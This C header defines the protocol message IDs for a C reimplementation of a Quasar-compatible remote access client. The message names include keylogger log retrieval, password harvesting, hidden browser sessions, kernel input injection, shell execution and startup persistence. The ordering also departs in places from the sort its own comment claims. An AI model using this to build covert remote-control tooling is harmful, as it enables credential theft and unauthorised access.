/**
 * remote_protocol_types.h
 * IMessage subtype indices matching reference Quasar.Common TypeRegistry.
 * TypeRegistry.GetPacketTypes(typeof(IMessage)).OrderBy(t => t.FullName, StringComparer.Ordinal)
 * gives a deterministic order; these 1-based indices must match.
 * Used so the C client sends/receives the same wire format as the .NET client.
 */
#ifndef REMOTE_PROTOCOL_TYPES_H
#define REMOTE_PROTOCOL_TYPES_H

/* IMessage subtype indices (1-based), sorted by type FullName. */
#define REMOTE_SUBTYPE_ClientIdentification           1
#define REMOTE_SUBTYPE_ClientIdentificationResult     2
#define REMOTE_SUBTYPE_DoAskElevate                    3
#define REMOTE_SUBTYPE_DoChangeRegistryValue           4
#define REMOTE_SUBTYPE_DoClientDisconnect             5
#define REMOTE_SUBTYPE_DoClientReconnect               6
#define REMOTE_SUBTYPE_DoClientUninstall              7
#define REMOTE_SUBTYPE_DoCloseConnection               8
#define REMOTE_SUBTYPE_DoCreateRegistryKey            9
#define REMOTE_SUBTYPE_DoCreateRegistryValue          10
#define REMOTE_SUBTYPE_DoDeleteRegistryKey            11
#define REMOTE_SUBTYPE_DoDeleteRegistryValue          12
#define REMOTE_SUBTYPE_DoKeyboardEvent                13
#define REMOTE_SUBTYPE_DoLoadRegistryKey              14
#define REMOTE_SUBTYPE_DoMouseEvent                   15
#define REMOTE_SUBTYPE_DoPathDelete                    16
#define REMOTE_SUBTYPE_DoPathRename                    17
#define REMOTE_SUBTYPE_DoProcessEnd                    18
#define REMOTE_SUBTYPE_DoProcessResponse               19
#define REMOTE_SUBTYPE_DoProcessStart                  20
#define REMOTE_SUBTYPE_DoRenameRegistryKey            21
#define REMOTE_SUBTYPE_DoRenameRegistryValue          22
#define REMOTE_SUBTYPE_DoShellExecute                  23
#define REMOTE_SUBTYPE_DoShellExecuteResponse         24
#define REMOTE_SUBTYPE_DoShowMessageBox                25
#define REMOTE_SUBTYPE_DoShutdownAction                26
#define REMOTE_SUBTYPE_DoStartupItemAdd                27
#define REMOTE_SUBTYPE_DoStartupItemRemove             28
#define REMOTE_SUBTYPE_DoSetRemoteControlMode          29
#define REMOTE_SUBTYPE_DoVisitWebsite                  30
#define REMOTE_SUBTYPE_DoWebcamStop                    31
#define REMOTE_SUBTYPE_FileTransferCancel              32
#define REMOTE_SUBTYPE_FileTransferChunk               33
#define REMOTE_SUBTYPE_FileTransferComplete            34
#define REMOTE_SUBTYPE_FileTransferRequest             35
#define REMOTE_SUBTYPE_GetChangeRegistryValueResponse  36
#define REMOTE_SUBTYPE_GetConnections                  37
#define REMOTE_SUBTYPE_GetConnectionsResponse          38
#define REMOTE_SUBTYPE_GetCreateRegistryKeyResponse    39
#define REMOTE_SUBTYPE_GetCreateRegistryValueResponse  40
#define REMOTE_SUBTYPE_GetDeleteRegistryKeyResponse    41
#define REMOTE_SUBTYPE_GetDeleteRegistryValueResponse  42
#define REMOTE_SUBTYPE_GetDesktop                      43
#define REMOTE_SUBTYPE_GetDesktopResponse              44
#define REMOTE_SUBTYPE_GetDirectory                    45
#define REMOTE_SUBTYPE_GetDirectoryResponse            46
#define REMOTE_SUBTYPE_GetDrives                       47
#define REMOTE_SUBTYPE_GetDrivesResponse               48
#define REMOTE_SUBTYPE_GetKeyloggerLogsDirectory       49
#define REMOTE_SUBTYPE_GetKeyloggerLogsDirectoryResponse 50
#define REMOTE_SUBTYPE_GetMonitors                     51
#define REMOTE_SUBTYPE_GetMonitorsResponse             52
#define REMOTE_SUBTYPE_GetPasswords                    53
#define REMOTE_SUBTYPE_GetPasswordsResponse            54
#define REMOTE_SUBTYPE_GetProcesses                    55
#define REMOTE_SUBTYPE_GetProcessesResponse            56
#define REMOTE_SUBTYPE_GetRegistryKeysResponse         57
#define REMOTE_SUBTYPE_GetRenameRegistryKeyResponse    58
#define REMOTE_SUBTYPE_GetRenameRegistryValueResponse  59
#define REMOTE_SUBTYPE_GetStartupItems                  60
#define REMOTE_SUBTYPE_GetStartupItemsResponse         61
#define REMOTE_SUBTYPE_GetSystemInfo                   62
#define REMOTE_SUBTYPE_GetSystemInfoResponse           63
#define REMOTE_SUBTYPE_SetStatus                       64
#define REMOTE_SUBTYPE_SetStatusFileManager            65
#define REMOTE_SUBTYPE_SetUserStatus                   66
#define REMOTE_SUBTYPE_ReverseProxyConnect             67
#define REMOTE_SUBTYPE_ReverseProxyConnectResponse     68
#define REMOTE_SUBTYPE_ReverseProxyData                69
#define REMOTE_SUBTYPE_ReverseProxyDisconnect          70
#define REMOTE_SUBTYPE_DoInitKernelInput               121
#define REMOTE_SUBTYPE_KernelInputInitResponse         122
#define REMOTE_SUBTYPE_DoStartHiddenBrowser            123
#define REMOTE_SUBTYPE_DoStopHiddenBrowser             124
#define REMOTE_SUBTYPE_DoCloseHiddenBrowser            125
#define REMOTE_SUBTYPE_GetHiddenBrowser                126
#define REMOTE_SUBTYPE_GetHiddenBrowserResponse        127
#define REMOTE_SUBTYPE_CloseHiddenBrowserResult        128

#endif /* REMOTE_PROTOCOL_TYPES_H */
